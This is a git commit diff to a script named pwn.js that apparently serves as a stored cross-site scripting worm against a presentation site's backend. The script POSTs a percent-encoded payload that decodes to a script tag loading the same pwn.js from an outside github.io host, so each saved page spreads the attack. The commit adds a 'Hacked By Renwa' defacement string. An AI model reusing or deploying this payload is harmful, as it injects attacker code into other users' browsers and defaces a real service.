4e1749b583011d5f54efa69e8f93e919cf70f701
Renwa <renwax23@gmail.com>
2019-01-13 21:48:54 +0300

    Update pwn.js

--- pwn.js
+++ pwn.js
@@ -1,4 +1,4 @@
 var xhttp = new XMLHttpRequest();
 xhttp.open("POST", "https://1x.com/backend/run.php", true);
 xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-xhttp.send("action=savepresentation&id=&text=%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%72%65%6e%77%61%78%32%33%2e%67%69%74%68%75%62%2e%69%6f%2f%58%2f%70%77%6e%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e&button=savepresentationbutton");
+xhttp.send("action=savepresentation&id=&text=Hacked By Renwa%3c%73%63%72%69%70%74%20%73%72%63%3d%22%68%74%74%70%73%3a%2f%2f%72%65%6e%77%61%78%32%33%2e%67%69%74%68%75%62%2e%69%6f%2f%58%2f%70%77%6e%2e%6a%73%22%3e%3c%2f%73%63%72%69%70%74%3e&button=savepresentationbutton");
